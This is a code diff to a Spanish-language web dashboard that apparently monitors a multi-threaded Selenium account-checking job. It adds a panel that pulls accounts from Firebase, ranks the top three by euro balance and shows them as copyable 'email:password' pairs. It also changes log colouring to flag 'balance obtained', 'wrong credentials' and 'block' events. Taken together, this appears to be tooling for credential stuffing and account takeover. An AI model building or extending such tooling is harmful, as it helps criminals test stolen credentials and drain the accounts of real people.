@@ -284,6 +284,27 @@
                 </div>
             </section>
 
+            <!-- Section: Top 3 Cuentas con Mayor Saldo -->
+            <section>
+                <div class="glass-panel" style="border-left: 3px solid var(--accent-green); padding: 1.25rem;">
+                    <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 0.75rem;">
+                        <div style="display: flex; align-items: center; gap: 0.75rem;">
+                            <span style="font-size: 1.5rem;">🏆</span>
+                            <div>
+                                <h3 style="margin: 0; font-size: 1rem; font-weight: 700; color: var(--text-primary);">Top 3 Cuentas con Mayor Saldo</h3>
+                                <p style="margin: 0; font-size: 0.75rem; color: var(--text-secondary);">Formato email:contraseña listo para copiar</p>
+                            </div>
+                        </div>
+                        <button id="copy-top3-btn" class="pagination-btn" onclick="copyTop3()" style="white-space: nowrap; background: rgba(0, 255, 135, 0.1); border-color: rgba(0, 255, 135, 0.2); color: var(--accent-green); font-size: 0.8rem;">
+                            📋 Copiar
+                        </button>
+                    </div>
+                    <div id="top3-accounts-container" style="font-family: 'JetBrains Mono', monospace; font-size: 0.85rem;">
+                        <div style="color: var(--text-muted); text-align: center; padding: 1rem 0;">Esperando datos de ejecución...</div>
+                    </div>
+                </div>
+            </section>
+
             <!-- Section: Hilos y Consola de Comandos -->
             <div class="live-grid">
                 
@@ -777,15 +798,17 @@
         function startLiveMonitor() {
             if (livePollInterval) clearInterval(livePollInterval);
             
-            // Poll progress and logs
+            // Poll progress, logs, and top accounts
             livePollInterval = setInterval(() => {
                 fetchLiveProgress();
                 fetchLiveLogs();
+                fetchTop3Accounts();
             }, 2000);
 
             // Initial fetch
             fetchLiveProgress();
             fetchLiveLogs();
+            fetchTop3Accounts();
         }
 
         async function fetchLiveProgress() {
@@ -886,10 +909,12 @@
             
             if (data.threads && Object.keys(data.threads).length > 0) {
                 const threadIds = Object.keys(data.threads).sort();
-                threadsTitleCount.innerText = `${threadIds.length} Hilos configurados`;
+                // Filter out null/undefined entries (Firebase converts sparse dict to array with null at index 0)
+                const validThreadIds = threadIds.filter(tid => data.threads[tid] != null);
+                threadsTitleCount.innerText = `${validThreadIds.length} Hilos configurados`;
                 
                 let html = '';
-                threadIds.forEach(tid => {
+                validThreadIds.forEach(tid => {
                     const t = data.threads[tid];
                     // Check if idle (last active time > 45 seconds ago)
                     const nowSec = Math.round(Date.now() / 1000);
@@ -972,21 +997,23 @@
 
             slicedLines.forEach(line => {
                 if (!line.trim()) return;
+                // Filter out Selenium/Chrome stack traces (memory addresses)
+                if ((line.trim().startsWith('#') && line.includes('0x')) || line.includes('Stacktrace:') || line.includes('(Session info:') || line.includes('<unknown>')) return;
                 
                 const div = document.createElement('div');
                 div.className = 'log-line';
                 
-                // Colorize text
+                // Colorize text (detect both ✔️ with variation selector and ✔ without)
                 let colorClass = 'log-system';
-                if (line.includes('✔️') || line.includes('SALDO OBTENIDO') || line.includes('exitoso')) {
+                if (line.includes('✔') || line.includes('SALDO') || line.includes('exitoso') || line.includes('success')) {
                     colorClass = 'log-success';
-                } else if (line.includes('❌') || line.includes('Error') || line.includes('fallidos')) {
+                } else if (line.includes('❌') || line.includes('Error') || line.includes('fallidos') || line.includes('error')) {
                     colorClass = 'log-error';
-                } else if (line.includes('⚠️') || line.includes('Warning') || line.includes('Credenciales incorrectas')) {
+                } else if (line.includes('⚠') || line.includes('Warning') || line.includes('Credenciales incorrectas') || line.includes('bloqueo')) {
                     colorClass = 'log-warning';
-                } else if (line.includes('[HILO')) {
+                } else if (line.includes('[Hilo') || line.includes('[HILO') || line.includes('→')) {
                     colorClass = 'log-thread';
-                } else if (line.includes('🚀') || line.includes('📊') || line.includes('💾') || line.includes('⏱️')) {
+                } else if (line.includes('🚀') || line.includes('📊') || line.includes('💾') || line.includes('⏱')) {
                     colorClass = 'log-info';
                 }
 
@@ -996,6 +1023,64 @@
 
             // Scroll to bottom
             consoleBody.scrollTop = consoleBody.scrollHeight;
+        }
+
+        // --- Top 3 Accounts Logic ---
+        let top3Data = [];
+
+        async function fetchTop3Accounts() {
+            if (!firebaseURL) return;
+            try {
+                let cleanedUrl = firebaseURL.endsWith('/') ? firebaseURL.slice(0, -1) : firebaseURL;
+                const res = await fetch(`${cleanedUrl}/top_accounts.json`);
+                if (res.ok) {
+                    const data = await res.json();
+                    if (Array.isArray(data) && data.length > 0) {
+                        top3Data = data;
+                        renderTop3();
+                    }
+                }
+            } catch (err) {
+                console.warn("Error leyendo top_accounts de Firebase", err);
+            }
+        }
+
+        function renderTop3() {
+            const container = document.getElementById('top3-accounts-container');
+            if (!top3Data || top3Data.length === 0) {
+                container.innerHTML = '<div style="color: var(--text-muted); text-align: center; padding: 1rem 0;">No hay datos disponibles todavía.</div>';
+                return;
+            }
+            let html = '';
+            top3Data.forEach((acc, i) => {
+                const medal = i === 0 ? '🥇' : i === 1 ? '🥈' : '🥉';
+                html += `
+                    <div style="display: flex; align-items: center; justify-content: space-between; padding: 0.6rem 0.75rem; margin-bottom: 0.35rem; background: rgba(255,255,255,0.03); border-radius: 8px; border: 1px solid rgba(255,255,255,0.06);">
+                        <div style="display: flex; align-items: center; gap: 0.5rem;">
+                            <span style="font-size: 1.1rem;">${medal}</span>
+                            <code style="color: var(--text-primary); word-break: break-all;">${escapeHtml(acc.email)}:${escapeHtml(acc.password)}</code>
+                        </div>
+                        <span style="color: var(--accent-green); font-weight: 700; white-space: nowrap; margin-left: 0.75rem;">${acc.balance.toFixed(2)} €</span>
+                    </div>
+                `;
+            });
+            container.innerHTML = html;
+        }
+
+        function copyTop3() {
+            if (!top3Data || top3Data.length === 0) return;
+            const text = top3Data.map(acc => `${acc.email}:${acc.password}`).join('\n');
+            navigator.clipboard.writeText(text).then(() => {
+                const btn = document.getElementById('copy-top3-btn');
+                btn.innerText = '✅ Copiado!';
+                btn.style.background = 'rgba(0, 255, 135, 0.2)';
+                setTimeout(() => {
+                    btn.innerText = '📋 Copiar';
+                    btn.style.background = 'rgba(0, 255, 135, 0.1)';
+                }, 2000);
+            }).catch(err => {
+                console.error('Error al copiar:', err);
+            });
         }
 
         function clearLiveLogs() {
